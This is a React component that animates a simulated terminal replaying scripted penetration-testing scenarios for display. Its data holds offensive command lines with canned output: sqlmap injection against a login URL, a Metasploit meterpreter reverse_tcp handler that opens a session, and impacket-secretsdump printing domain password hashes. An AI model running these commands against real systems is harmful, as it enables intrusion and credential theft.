import React, { useState, useEffect, useRef } from 'react';
import { Play, Pause, RotateCcw } from 'lucide-react';
import { Button } from '@/components/UI/button';

interface Command {
    command: string;
    output: string[];
    delay: number;
}

interface Scenario {
    name: string;
    description: string;
    commands: Command[];
}

const scenarios: Scenario[] = [
    {
        name: "Web Application Reconnaissance",
        description: "Subdomain enumeration and vulnerability scanning",
        commands: [
            {
                command: "subfinder -d target.com -silent",
                output: [
                    "api.target.com",
                    "admin.target.com",
                    "dev.target.com",
                    "staging.target.com",
                    "mail.target.com"
                ],
                delay: 1500
            },
            {
                command: "nuclei -u https://admin.target.com -t cves/ -silent",
                output: [
                    "[CVE-2023-1234] [critical] SQL Injection detected",
                    "[CVE-2023-5678] [high] XSS vulnerability found",
                    "[CVE-2022-9876] [medium] Information disclosure"
                ],
                delay: 2000
            },
            {
                command: 'sqlmap -u "https://admin.target.com/login?id=1" --batch --dbs',
                output: [
                    "[INFO] testing connection to the target URL",
                    "[INFO] testing 'MySQL >= 5.0 AND error-based'",
                    "[SUCCESS] parameter 'id' is vulnerable to SQL injection",
                    "[INFO] fetching database names",
                    "available databases [3]:",
                    "[*] information_schema",
                    "[*] mysql",
                    "[*] webapp_db"
                ],
                delay: 2500
            }
        ]
    },
    {
        name: "Network Penetration Testing",
        description: "Port scanning and exploitation",
        commands: [
            {
                command: "nmap -sV -p- 10.10.10.50",
                output: [
                    "Starting Nmap 7.94",
                    "Nmap scan report for 10.10.10.50",
                    "PORT     STATE SERVICE     VERSION",
                    "22/tcp   open  ssh         OpenSSH 7.4",
                    "80/tcp   open  http        Apache httpd 2.4.29",
                    "3306/tcp open  mysql       MySQL 5.7.33",
                    "8080/tcp open  http-proxy  Squid 3.5.27"
                ],
                delay: 2000
            },
            {
                command: "msfconsole -q",
                output: [
                    "       =[ metasploit v6.3.55-dev                          ]",
                    "+ -- --=[ 2397 exploits - 1235 auxiliary - 413 post       ]",
                    "+ -- --=[ 1391 payloads - 46 encoders - 11 nops           ]",
                    "+ -- --=[ 9 evasion                                       ]",
                    "",
                    "msf6 >"
                ],
                delay: 1500
            },
            {
                command: "use exploit/multi/handler",
                output: ["msf6 exploit(multi/handler) >"],
                delay: 500
            },
            {
                command: "set PAYLOAD windows/x64/meterpreter/reverse_tcp",
                output: [
                    "PAYLOAD => windows/x64/meterpreter/reverse_tcp",
                    "msf6 exploit(multi/handler) >"
                ],
                delay: 500
            },
            {
                command: "exploit",
                output: [
                    "[*] Started reverse TCP handler on 10.10.14.5:4444",
                    "[*] Sending stage (201798 bytes) to 10.10.10.50",
                    "[*] Meterpreter session 1 opened",
                    "",
                    "meterpreter >"
                ],
                delay: 2000
            }
        ]
    },
    {
        name: "Active Directory Enumeration",
        description: "Domain reconnaissance and privilege escalation",
        commands: [
            {
                command: "bloodhound-python -d corp.local -u user -p password -c all",
                output: [
                    "INFO: Found AD domain: corp.local",
                    "INFO: Connecting to LDAP server: dc01.corp.local",
                    "INFO: Found 1 domains",
                    "INFO: Found 1 domains in the forest",
                    "INFO: Found 245 users",
                    "INFO: Found 52 groups",
                    "INFO: Found 15 computers",
                    "INFO: Done in 00M 23S"
                ],
                delay: 2000
            },
            {
                command: "impacket-secretsdump corp.local/admin@10.10.10.100",
                output: [
                    "[*] Service RemoteRegistry is in stopped state",
                    "[*] Starting service RemoteRegistry",
                    "[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)",
                    "[*] Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::",
                    "[*] Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::",
                    "[*] krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1a2b3c4d5e6f7g8h9i0j1k2l3m4n5o6p:::",
                    "[*] Cleaning up..."
                ],
                delay: 2500
            }
        ]
    }
];

const LiveTerminalDemo: React.FC = () => {
    const [selectedScenario, setSelectedScenario] = useState(0);
    const [isPlaying, setIsPlaying] = useState(false);
    const [currentCommandIndex, setCurrentCommandIndex] = useState(0);
    const [displayedText, setDisplayedText] = useState('');
    const [isTyping, setIsTyping] = useState(false);
    const [terminalHistory, setTerminalHistory] = useState<Array<{ command: string; output: string[] }>>([]);
    const terminalRef = useRef<HTMLDivElement>(null);
    const timeoutRef = useRef<NodeJS.Timeout | null>(null);

    const currentScenario = scenarios[selectedScenario];

    useEffect(() => {
        if (terminalRef.current) {
            terminalRef.current.scrollTop = terminalRef.current.scrollHeight;
        }
    }, [terminalHistory, displayedText]);

    useEffect(() => {
        if (!isPlaying || currentCommandIndex >= currentScenario.commands.length) {
            setIsPlaying(false);
            return;
        }

        const currentCommand = currentScenario.commands[currentCommandIndex];

        // Type command
        setIsTyping(true);
        let charIndex = 0;
        const typingInterval = setInterval(() => {
            if (charIndex <= currentCommand.command.length) {
                setDisplayedText(currentCommand.command.slice(0, charIndex));
                charIndex++;
            } else {
                clearInterval(typingInterval);
                setIsTyping(false);

                // Show output after delay
                const timeoutId = setTimeout(() => {
                    setTerminalHistory(prev => [...prev, {
                        command: currentCommand.command,
                        output: currentCommand.output
                    }]);
                    setDisplayedText('');
                    setCurrentCommandIndex(prev => prev + 1);
                }, 500);

                // Store timeout ID for cleanup
                // We need a ref to store it because this is inside an interval closure
                // However, the cleanest way is to use a ref for the timeout accessible to the cleanup function
                // But since we can't easily export it from here to the main cleanup, 
                // we'll rely on a mutable ref defined in the component scope or a more robust effect structure.
                // A simpler fix for this specific structure:
                timeoutRef.current = timeoutId;
            }
        }, 50);

        return () => {
            clearInterval(typingInterval);
            if (timeoutRef.current) {
                clearTimeout(timeoutRef.current);
            }
        };
    }, [isPlaying, currentCommandIndex, currentScenario]);

    const handlePlay = () => {
        if (currentCommandIndex >= currentScenario.commands.length) {
            handleReset();
        }
        setIsPlaying(true);
    };

    const handlePause = () => {
        setIsPlaying(false);
    };

    const handleReset = () => {
        setIsPlaying(false);
        setCurrentCommandIndex(0);
        setDisplayedText('');
        setTerminalHistory([]);
    };

    const handleScenarioChange = (index: number) => {
        setSelectedScenario(index);
        handleReset();
    };

    return (
        <div className="w-full max-w-5xl mx-auto space-y-4">
            {/* Scenario Selector */}
            <div className="flex gap-2 flex-wrap">
                {scenarios.map((scenario, index) => (
                    <button
                        key={index}
                        onClick={() => handleScenarioChange(index)}
                        className={`px-4 py-2 rounded-md text-sm font-medium transition-colors ${selectedScenario === index
                            ? 'bg-primary text-primary-foreground'
                            : 'bg-secondary text-secondary-foreground hover:bg-secondary/80'
                            }`}
                    >
                        {scenario.name}
                    </button>
                ))}
            </div>

            {/* Terminal Window */}
            <div className="terminal-window">
                {/* Terminal Header */}
                <div className="flex items-center justify-between px-4 py-3 border-b border-primary/20">
                    <div className="flex items-center gap-2">
                        <div className="flex gap-2">
                            <div className="w-3 h-3 rounded-full bg-red-500/80"></div>
                            <div className="w-3 h-3 rounded-full bg-yellow-500/80"></div>
                            <div className="w-3 h-3 rounded-full bg-green-500/80"></div>
                        </div>
                        <span className="ml-4 text-sm text-muted-foreground font-mono">
                            {currentScenario.description}
                        </span>
                    </div>

                    {/* Controls */}
                    <div className="flex gap-2">
                        {!isPlaying ? (
                            <Button
                                size="sm"
                                variant="ghost"
                                onClick={handlePlay}
                                className="h-8 w-8 p-0"
                            >
                                <Play className="h-4 w-4" />
                            </Button>
                        ) : (
                            <Button
                                size="sm"
                                variant="ghost"
                                onClick={handlePause}
                                className="h-8 w-8 p-0"
                            >
                                <Pause className="h-4 w-4" />
                            </Button>
                        )}
                        <Button
                            size="sm"
                            variant="ghost"
                            onClick={handleReset}
                            className="h-8 w-8 p-0"
                        >
                            <RotateCcw className="h-4 w-4" />
                        </Button>
                    </div>
                </div>

                {/* Terminal Content */}
                <div
                    ref={terminalRef}
                    className="p-4 h-96 overflow-y-auto font-mono text-sm space-y-2"
                >
                    {/* History */}
                    {terminalHistory.map((entry, index) => (
                        <div key={index} className="space-y-1">
                            <div className="flex items-center gap-2">
                                <span className="text-green-500">$</span>
                                <span className="text-blue-400">{entry.command}</span>
                            </div>
                            {entry.output.map((line, lineIndex) => (
                                <div key={lineIndex} className="text-green-500/80 pl-4">
                                    {line}
                                </div>
                            ))}
                        </div>
                    ))}

                    {/* Current typing command */}
                    {isTyping && (
                        <div className="flex items-center gap-2">
                            <span className="text-green-500">$</span>
                            <span className="text-blue-400">
                                {displayedText}
                                <span className="terminal-cursor inline-block w-2 h-4 bg-green-500/80 ml-1"></span>
                            </span>
                        </div>
                    )}

                    {/* Idle cursor */}
                    {!isTyping && terminalHistory.length > 0 && currentCommandIndex >= currentScenario.commands.length && (
                        <div className="flex items-center gap-2">
                            <span className="text-green-500">$</span>
                            <span className="terminal-cursor inline-block w-2 h-4 bg-green-500/80 ml-1"></span>
                        </div>
                    )}
                </div>
            </div>
        </div>
    );
};

export default LiveTerminalDemo;
